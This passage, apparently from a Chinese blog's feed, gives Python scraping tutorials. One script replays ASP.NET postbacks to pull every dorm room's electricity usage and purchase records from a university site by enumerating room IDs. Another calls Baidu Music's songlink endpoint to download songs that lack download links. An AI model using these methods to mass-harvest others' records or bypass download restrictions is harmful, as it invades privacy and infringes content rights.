CAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTE2IDA6MDA6MDBkZAICDw8WAh8ABQMyMzRkZAIKD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTE1IDA6MDA6MDBkZAICDw8WAh8ABQMyMzZkZAILDw8WAh4HVmlzaWJsZWhkZAIIDzwrAA0BAA8WBB8BZx8CAgVkFgJmD2QWDgIBD2QWDmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTcgMTQ6MTM6NDBkZAICDw8WAh8ABQMyNTBkZAIDDw8WAh8ABQMxMjBkZAIEDw8WAh8ABQfotK0g55S1ZGQCBQ8PFgIfAAUM5Yqg55S15a6M5oiQZGQCBg8PFgIfAAUJ5byg6ICB5biIZGQCAg9kFg5mDw8WAh8ABTIxLTEwMSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRkAgEPDxYCHwAFETIwMTQtMi0xOCA4OjI3OjQ2ZGQCAg8PFgIfAAUDMjgwZGQCAw8PFgIfAAUBMGRkAgQPDxYCHwAFB+WFjSDotLlkZAIFDw8WAh8ABQzliqDnlLXlrozmiJBkZAIGDw8WAh8ABQnlvKDogIHluIhkZAIDD2QWDmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAUQMjAxMy05LTMgOTo1NTowOGRkAgIPDxYCHwAFAzI4MGRkAgMPDxYCHwAFATBkZAIEDw8WAh8ABQflhY0g6LS5ZGQCBQ8PFgIfAAUM5Yqg55S15a6M5oiQZGQCBg8PFgIfAAUJ5byg6ICB5biIZGQCBA9kFg5mDw8WAh8ABTIxLTEwMSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRkAgEPDxYCHwAFEjIwMTMtMy0yMCAxNjozMzoyNWRkAgIPDxYCHwAFAzE4MGRkAgMPDxYCHwAFATBkZAIEDw8WAh8ABQflhY0g6LS5ZGQCBQ8PFgIfAAUM5Yqg55S15a6M5oiQZGQCBg8PFgIfAAUJ5byg6ICB5biIZGQCBQ9kFg5mDw8WAh8ABTIxLTEwMSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRkAgEPDxYCHwAFETIwMTMtMy0xIDE1OjM5OjIxZGQCAg8PFgIfAAUDMTAwZGQCAw8PFgIfAAUBMGRkAgQPDxYCHwAFB+WFjSDotLlkZAIFDw8WAh8ABQzliqDnlLXlrozmiJBkZAIGDw8WAh8ABQnlvKDogIHluIhkZAIGDw8WAh8DaGRkAgcPDxYCHwNoZGQYAgUJR3JpZFZpZXcyDzwrAAoBCAIBZAUJR3JpZFZpZXcxDzwrAAoBCAIoZG6dKHZt7NdjJRdl8NOMCRx8QVCP'</span>} 

<span class="keyword">In</span> [<span class="number">16</span>]: r = requests.post(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num, <span class="keyword">data</span>=<span class="keyword">data</span>)

<span class="keyword">In</span> [<span class="number">17</span>]: r
Out[<span class="number">17</span>]: &lt;Response [<span class="number">200</span>]&gt;
</code></pre><p>成功的返回了需要的用电数据，你可以检查下r.content看看</p>
<p>接下来的问题在于，这些参数从哪里来的？</p>
<p>简单谷歌下和检查下网页源代码，可以看到</p>
<p><img src="/images/spider/ydcx6.png" alt=""></p>
<p>那么逻辑就清晰了，先get请求某个寝室的页面，获取对应的post参数，然后一页一页往后翻就是。</p>
<p>下面讲讲如何从html源码中提取信息，用re当然可以，但是xpath这种东西也许更好用。比如</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## parse the content</span></span><br><span class="line">root = fromstring(r.content)</span><br><span class="line"><span class="comment">## extract __VIEWSTATE</span></span><br><span class="line">__VIEWSTATE = root.xpath(<span class="string">'//input[@name="__VIEWSTATE"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="comment">## extract __EVENTVALIDATION</span></span><br><span class="line">__EVENTVALIDATION = root.xpath(<span class="string">'//input[@name="__EVENTVALIDATION"]/@value'</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<p>相比写这么个正则简单优雅很多，不过所谓quick and dirty，不管黑猫白猫……：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.search(<span class="string">'id="__VIEWSTATE" value="([^"]+)", r.content).group(1)</span></span><br></pre></td></tr></table></figure>
<p>接下来的问题在于，页码总数我不知道，最后的一个…符号可以进入下一个十页。</p>
<p><img src="/images/spider/ydcx4.png" alt=""></p>
<p><img src="/images/spider/ydcx5.png" alt=""></p>
<p>那么，反正最后经过trial and error以一种很quick and dirty的方式work around页码这个问题……</p>
<p>我的解决方案，一个循环，页码不断加一，并且读取当前页右下角所有显示页码。</p>
<p>如果当前页面的那些页码cpn中最后一个，比我下一个想要抓取的np页码小一，或者当前页码个数不是十个，就肯定是最后几页了，就可以抓取然后break不继续往后抓取了。</p>
<p>if (int(cpn[-1]) == np - 1) or (int(cpn[-1]) % 10 != 0):</p>
<p>反正……最后可以运行……</p>
<p><img src="/images/spider/ydcx7.png" alt=""></p>
<p>多么不堪入目的实现，随便看看玩</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">用电信息</span><br><span class="line">http://ydcx.bupt.edu.cn/Default.aspx</span><br><span class="line">"""</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">"Reverland"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line">monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml.html <span class="keyword">import</span> fromstring</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">timeout = <span class="number">30</span></span><br><span class="line">socket.setdefaulttimeout(timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.makedirs(<span class="string">'data'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_info</span><span class="params">(dorm_num, root)</span>:</span></span><br><span class="line">    <span class="comment"># skip for downloaded</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">'data/'</span> + dorm_num + <span class="string">'.csv'</span>):</span><br><span class="line">        <span class="keyword">print</span> dorm_num + <span class="string">'buy info downloaded...'</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    data = root.xpath(<span class="string">'//table[@id="GridView2"]/tr/td/font/text()'</span>)</span><br><span class="line">    <span class="comment"># header</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'_buy.csv'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">'timestamp, electric_increase, money, charge_bool, state, operator\n'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">        <span class="comment"># timestamp, electric_increase, money, charge_bool, state, operator</span></span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">7</span> &lt; <span class="number">6</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'_buy.csv'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(data[i].encode(<span class="string">'iso-8859-1'</span>).strip() + <span class="string">','</span>)</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">7</span> == <span class="number">6</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'_buy.csv'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(data[i].encode(<span class="string">'iso-8859-1'</span>).strip() + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_dorm_elec</span><span class="params">(dorm_num)</span>:</span></span><br><span class="line">    <span class="comment"># skip for downloaded</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">'data/'</span> + dorm_num + <span class="string">'.csv'</span>):</span><br><span class="line">        <span class="keyword">print</span> dorm_num + <span class="string">' downloaded...'</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"parsing "</span> + dorm_num + <span class="string">' now...'</span></span><br><span class="line">    data = []</span><br><span class="line">    r = requests.get(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num)</span><br><span class="line">    <span class="comment">## parse the content</span></span><br><span class="line">    root = fromstring(r.content)</span><br><span class="line">    <span class="comment">## extract __VIEWSTATE</span></span><br><span class="line">    __VIEWSTATE = root.xpath(<span class="string">'//input[@name="__VIEWSTATE"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">## extract __EVENTVALIDATION</span></span><br><span class="line">    __EVENTVALIDATION = root.xpath(<span class="string">'//input[@name="__EVENTVALIDATION"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">## __EVENTTARGET is fixed</span></span><br><span class="line">    __EVENTTARGET = <span class="string">'GridView1'</span></span><br><span class="line">    buy_info(dorm_num, root)</span><br><span class="line">    <span class="comment">## define headers</span></span><br><span class="line">    header = &#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">    &#125;</span><br><span class="line">    np = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># First extract some value</span></span><br><span class="line">        <span class="comment"># print "Retrieving data from page", np</span></span><br><span class="line">        __EVENTARGUMENT = <span class="string">'Page$'</span> + str(np)</span><br><span class="line">        payload = &#123;</span><br><span class="line">        <span class="string">'__EVENTARGUMENT'</span>: __EVENTARGUMENT,</span><br><span class="line">        <span class="string">'__EVENTTARGET'</span>: __EVENTTARGET,</span><br><span class="line">        <span class="string">'__EVENTVALIDATION'</span>: __EVENTVALIDATION,</span><br><span class="line">        <span class="string">'__VIEWSTATE'</span>: __VIEWSTATE&#125;</span><br><span class="line">        r = requests.post(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num, data=payload, headers=header)</span><br><span class="line">        <span class="comment">## get electric data</span></span><br><span class="line">        data += re.findall(<span class="string">'&lt;td align="center"&gt;&lt;font color="#4A3C8C"&gt;([^&lt;]+)'</span>, r.content)</span><br><span class="line">        <span class="comment">## get current page numbers</span></span><br><span class="line">        cpn = re.findall(<span class="string">'\)"&gt;&lt;font color="#4A3C8C"&gt;([\d]+)'</span>, r.content)</span><br><span class="line">        <span class="keyword">if</span> (int(cpn[-<span class="number">1</span>]) == np - <span class="number">1</span>) <span class="keyword">or</span> (int(cpn[-<span class="number">1</span>]) % <span class="number">10</span> != <span class="number">0</span>):</span><br><span class="line">            cpn = range(np+<span class="number">1</span>, int(cpn[-<span class="number">1</span>]) + <span class="number">1</span>)</span><br><span class="line">            <span class="comment">## next page</span></span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> cpn:</span><br><span class="line">                <span class="comment">## parse the content</span></span><br><span class="line">                root = fromstring(r.content)</span><br><span class="line">                <span class="comment">## extract __VIEWSTATE</span></span><br><span class="line">                __VIEWSTATE = root.xpath(<span class="string">'//input[@name="__VIEWSTATE"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">                <span class="comment">## extract __EVENTVALIDATION</span></span><br><span class="line">                __EVENTVALIDATION = root.xpath(<span class="string">'//input[@name="__EVENTVALIDATION"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">                __EVENTARGUMENT = <span class="string">'Page$'</span>+ str(p)</span><br><span class="line">                payload = &#123;</span><br><span class="line">                <span class="string">'__EVENTARGUMENT'</span>: __EVENTARGUMENT,</span><br><span class="line">                <span class="string">'__EVENTTARGET'</span>: __EVENTTARGET,</span><br><span class="line">                <span class="string">'__EVENTVALIDATION'</span>: __EVENTVALIDATION,</span><br><span class="line">                <span class="string">'__VIEWSTATE'</span>: __VIEWSTATE&#125;</span><br><span class="line">                r = requests.post(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num, data=payload, headers=header)</span><br><span class="line">                data += re.findall(<span class="string">'&lt;td align="center"&gt;&lt;font color="#4A3C8C"&gt;([^&lt;]+)'</span>, r.content)</span><br><span class="line">                <span class="comment"># print "Retrieving data from page", p</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">## next page</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> cpn:</span><br><span class="line">            <span class="comment">## parse the content</span></span><br><span class="line">            root = fromstring(r.content)</span><br><span class="line">            <span class="comment">## extract __VIEWSTATE</span></span><br><span class="line">            __VIEWSTATE = root.xpath(<span class="string">'//input[@name="__VIEWSTATE"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="comment">## extract __EVENTVALIDATION</span></span><br><span class="line">            __EVENTVALIDATION = root.xpath(<span class="string">'//input[@name="__EVENTVALIDATION"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line">            __EVENTARGUMENT = <span class="string">'Page$'</span> + p</span><br><span class="line">            payload = &#123;</span><br><span class="line">            <span class="string">'__EVENTARGUMENT'</span>: __EVENTARGUMENT,</span><br><span class="line">            <span class="string">'__EVENTTARGET'</span>: __EVENTTARGET,</span><br><span class="line">            <span class="string">'__EVENTVALIDATION'</span>: __EVENTVALIDATION,</span><br><span class="line">            <span class="string">'__VIEWSTATE'</span>: __VIEWSTATE&#125;</span><br><span class="line">            r = requests.post(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num, data=payload, headers=header)</span><br><span class="line">            data += re.findall(<span class="string">'&lt;td align="center"&gt;&lt;font color="#4A3C8C"&gt;([^&lt;]+)'</span>, r.content)</span><br><span class="line">            <span class="comment"># print "Retrieving data from page", p</span></span><br><span class="line">        <span class="comment"># check if reach end</span></span><br><span class="line">        np = int(cpn[-<span class="number">1</span>]) + <span class="number">1</span></span><br><span class="line">    <span class="comment"># write header</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'.csv'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">'timestamp'</span> + <span class="string">','</span> + <span class="string">'electric_remain\n'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'.csv'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(data[i] + <span class="string">','</span>)</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'data/'</span> + dorm_num + <span class="string">'.csv'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(data[i] + <span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    <span class="comment">## for example</span></span><br><span class="line">    <span class="comment"># __EVENTVALIDATION = '/wEWCwKhncT7DwKtsp64BAKtsuK4BAKtsva4BAKtsvq4BAKtsu64BAKtsvK4BAKtssa4BAKtssq4BALDuK6IBQKokYx1vYI/vd4i5UCVuVYMSo/l30x1o/g='</span></span><br><span class="line">    <span class="comment"># __EVENTARGUMENT = 'Page$2'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#data = parse_dorm_elec(dorm_num)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_dorm_elec_wrap</span><span class="params">(dorm_num)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        parse_dorm_elec(dorm_num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"parsing "</span> + dorm_num + <span class="string">" error..."</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------</span></span><br><span class="line"><span class="comment"># # dorm 10</span></span><br><span class="line"><span class="comment"># dorms = []</span></span><br><span class="line"><span class="comment"># # layer 1</span></span><br><span class="line"><span class="comment"># dorms += map(lambda x: '10-1' + str(x).zfill(2), range(1, 17))</span></span><br><span class="line"><span class="comment"># # layer 2</span></span><br><span class="line"><span class="comment"># dorms += map(lambda x: '10-2' + str(x).zfill(2), range(1, 21))</span></span><br><span class="line"><span class="comment"># # layer 3 to 7</span></span><br><span class="line"><span class="comment"># for l in range(3, 8):</span></span><br><span class="line"><span class="comment">#     dorms += map(lambda x: '10-' + str(l) + str(x).zfill(2), range(1, 72))</span></span><br><span class="line"><span class="comment"># # layer 8 to 13</span></span><br><span class="line"><span class="comment"># for l in range(8, 14):</span></span><br><span class="line"><span class="comment">#     dorms += map(lambda x: '10-' + str(l) + str(x).zfill(2) , range(1, 53))</span></span><br><span class="line"><span class="comment"># ------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------</span></span><br><span class="line"><span class="comment"># dorm 1</span></span><br><span class="line">dorms = []</span><br><span class="line"><span class="comment"># layer 1</span></span><br><span class="line">dorms += map(<span class="keyword">lambda</span> x: <span class="string">'1-'</span> + str(<span class="number">1</span>) + str(x).zfill(<span class="number">2</span>), range(<span class="number">1</span>, <span class="number">24</span>))</span><br><span class="line"><span class="comment"># layer 2,5</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">6</span>):</span><br><span class="line">    dorms += map(<span class="keyword">lambda</span> x: <span class="string">'1-'</span> + str(l) + str(x).zfill(<span class="number">2</span>), range(<span class="number">1</span>, <span class="number">27</span>))</span><br><span class="line"><span class="comment">#--------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for d in dorms:</span></span><br><span class="line"><span class="comment">#     try:</span></span><br><span class="line"><span class="comment">#         parse_dorm_elec_wrap(d)</span></span><br><span class="line"><span class="comment">#     except:</span></span><br><span class="line"><span class="comment">#         try:</span></span><br><span class="line"><span class="comment">#             parse_dorm_elec_wrap(d)</span></span><br><span class="line"><span class="comment">#         except:</span></span><br><span class="line"><span class="comment">#             print "Error with ", d</span></span><br><span class="line"><span class="comment">#             pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gevent.pool <span class="keyword">import</span> Pool</span><br><span class="line">pool = Pool(<span class="number">5</span>)</span><br><span class="line">pool.join(timeout=timeout)</span><br><span class="line">pool.map(parse_dorm_elec_wrap, dorms)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># print dorms</span></span><br><span class="line"><span class="comment"># parse_dorm_elec('10-1220')</span></span><br></pre></td></tr></table></figure>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="愿总有阳光照进回忆里：学生购电用电查询系统">愿总有阳光照进回忆里：学生购电用电查询系统</h2><p>感冒了，难得会被人挂念。谢谢，总有阳光照进回忆里，温暖的气息让人难以忘记。</p>
<hr>
<p>某天，一位大神师兄 @Zhaoking 神秘兮兮地给我看一个]]>
    </summary>
    
      <category term="python" scheme="http://reverland.org/tags/python/"/>
    
      <category term="spider" scheme="http://reverland.org/tags/spider/"/>
    
      <category term="python" scheme="http://reverland.org/categories/python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Python Spider: 爬取百度音乐]]></title>
    <link href="http://reverland.org/python/2015/04/02/baidu-music/"/>
    <id>http://reverland.org/python/2015/04/02/baidu-music/</id>
    <published>2015-04-01T16:00:00.000Z</published>
    <updated>2015-11-15T06:01:31.551Z</updated>
    <content type="html"><![CDATA[<h2 id="Take_a_sad_song,_and_make_it_better：爬取百度音乐">Take a sad song, and make it better：爬取百度音乐</h2><p>以下，个人的一个trial and error的过程，仅供参考。</p>
<p>用到一些基本知识比如HTTP请求啊，html啊，json啊，ajax啊，当然，不懂也没关系……<br>使用了一些工具比如firefox啊，firebug啊，python啊……当然你们喜欢用chrome/chromium还是IE都一样……</p>
<p>也许是我听的歌太小众了，经常会发现有些歌在线听的好好的，竟然没有下载链接</p>
<p><img src="/images/spider/baidu_music.png" alt="" title="baidu音乐">]</p>
<p>对此，很不理解，在线可以听到就说明浏览器已经把媒体文件下载下来并且播放出来了……为啥会告诉我没有下载链接？</p>
<p>某天，听到Beatles的Hey Jude，我忽然觉得得动手找找音乐文件是哪里的。于是，打开firebug，选择network标签下的media标签，可是什么也没有。</p>
<p><img src="/images/spider/baidumusic.png" alt=""></p>
<p>唉？于是又确认了下，百度音乐在线播放器不是flash，满满的html5标签= =</p>
<p>凭借直觉，应该和xmlhttprequest有关系，于是抱着试试看的心理打开firebug上的xhr标签</p>
<p><img src="/images/spider/baidumusic1.png" alt=""></p>
<p>哇，果然有好多请求，咦？songlink？凭借直觉似乎是音乐链接地址……</p>
<p>打开返回的json看了看果然有个来自file.qianqian.com的疑似歌曲链接(有时候用firebug的搜索功能也不失为良策)……</p>
<p><img src="/images/spider/baidumusic3.png" alt=""></p>
<p>把引号中的链接复制粘帖到地址栏，哇，果然是歌曲mp3啊</p>
<p><img src="/images/spider/baidumusic4.png" alt=""></p>
<p>我们可以再认真看看返回的json，其中有lrc歌词链接，有封面图片链接、歌曲文件大小啊等等</p>
<p>接下来的问题是，如果想下载其它歌曲怎么办。首先观察之前我们获取想要mp3链接的POST请求。</p>
<p><img src="/images/spider/baidumusic2.png" alt=""></p>
<p>请求参数中有一个songID？似乎很清晰的样子，我猜吧，每个歌曲在百度音乐库中都对应这么一个ID</p>
<p>后来发现确实差不多。</p>
<p>至此，可以开始写自己的爬虫了……</p>
<p>关键部分大致这样</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_by_song_id_list</span><span class="params">(song_id_list)</span>:</span></span><br><span class="line">    song_data = <span class="string">'songIds='</span> + <span class="string">"%2C"</span>.join(song_id_list)</span><br><span class="line">    song_link_url = <span class="string">"http://play.baidu.com/data/music/songlink"</span></span><br><span class="line">    headers = &#123;<span class="string">"X-Requested-With"</span>: <span class="string">"XMLHttpRequest"</span>,</span><br><span class="line">               <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded;\</span><br><span class="line">               charset=UTF-8"</span>&#125;</span><br><span class="line">    r = requests.post(song_link_url, data=song_data, headers=headers)</span><br><span class="line">    data = json.loads(r.content)</span><br><span class="line">    <span class="keyword">for</span> it <span class="keyword">in</span> data[<span class="string">'data'</span>][<span class="string">'songList'</span>]:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\n'</span> + it[<span class="string">'songName'</span>], <span class="string">': '</span>, it[<span class="string">'size'</span>], <span class="string">"bytes"</span></span><br><span class="line">        <span class="comment"># print it['songLink']</span></span><br><span class="line">        r_song = requests.get(it[<span class="string">'songLink'</span>], stream=<span class="keyword">True</span>)</span><br><span class="line">        <span class="keyword">with</span> open(it[<span class="string">'songName'</span>] + <span class="string">'.'</span> + it[<span class="string">'format'</span>], <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            dl = <span class="number">0</span></span><br><span class="line">            total_length = int(it[<span class="string">'size'</span>])</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> r_song.iter_content():</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> b:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                dl += len(b)</span><br><span class="line">                f.write(b)</span><br><span class="line">                done = int(<span class="number">50</span> * dl / total_length)</span><br><span class="line">                sys.stdout.write(<span class="string">"\r[%s%s] %.2f%%"</span></span><br><span class="line">                                 % (<span class="string">'='</span> * done, <span class="string">' '</span></span><br><span class="line">                                    * (<span class="number">50</span> - done), <span class="number">100.0</span> * dl / total_length))</span><br><span class="line"> 